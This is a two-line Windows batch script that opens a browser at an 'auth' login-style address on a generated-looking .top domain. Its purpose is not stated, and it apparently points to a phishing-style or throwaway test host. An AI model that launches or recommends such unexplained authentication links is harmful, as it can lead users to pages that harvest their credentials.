@echo off
start "" "https://auth.arg-auth-683dc0f14848.top/"
